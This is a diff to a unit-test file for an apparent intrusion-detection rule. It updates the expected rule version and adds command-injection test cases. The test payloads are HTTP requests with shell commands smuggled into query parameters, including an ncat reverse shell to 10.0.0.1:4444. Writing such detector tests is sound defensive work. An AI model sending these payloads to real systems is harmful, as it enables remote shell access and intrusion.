@@ -199,7 +199,7 @@ class TestPayloadRule(unittest.TestCase):
         suffix.update(tcp_flags=0x18, tcp_seq=1018)
         alert = self.rule.check(suffix)
         self.assertIsNotNone(alert)
-        self.assertEqual(alert["rule_version"], "1.21")
+        self.assertEqual(alert["rule_version"], "1.22")
         self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
     def test_retransmitted_syn_does_not_reset_current_tcp_stream(self):
@@ -661,21 +661,24 @@ class TestPayloadRule(unittest.TestCase):
                 pkt = self.packet(payload, 5404)
                 alert = rule.check(pkt)
                 self.assertIsNotNone(alert)
-                self.assertEqual(alert["rule_version"], "1.21")
+                self.assertEqual(alert["rule_version"], "1.22")
                 self.assertIn("SSRF", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
     def test_usr_bin_bash_cmd_injection_detected(self):
-        # /usr/bin/bash, /usr/bin/sh, and /bin/dash in command injection
+        # /usr/bin/bash, /usr/bin/sh, /usr/bin/zsh, and /bin/dash in command injection
         for cmd in (
             b"GET /exec?cmd=;+/usr/bin/bash+-i HTTP/1.1\r\n\r\n",
             b"GET /test?x=%26%26+/usr/bin/sh+-c+id HTTP/1.1\r\n\r\n",
             b"GET /run?arg=;+/bin/dash+-c+whoami HTTP/1.1\r\n\r\n",
+            b"GET /run?arg=;+/usr/bin/zsh+-c+id HTTP/1.1\r\n\r\n",
+            b"GET /shell?x=%3B+ncat+-e+/usr/bin/sh+10.0.0.1+4444 HTTP/1.1\r\n\r\n",
         ):
             with self.subTest(cmd=cmd):
                 rule = PayloadRule()
                 pkt = self.packet(cmd, 5405)
                 alert = rule.check(pkt)
                 self.assertIsNotNone(alert)
+                self.assertEqual(alert["rule_version"], "1.22")
                 self.assertIn("CMD_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])
 
 
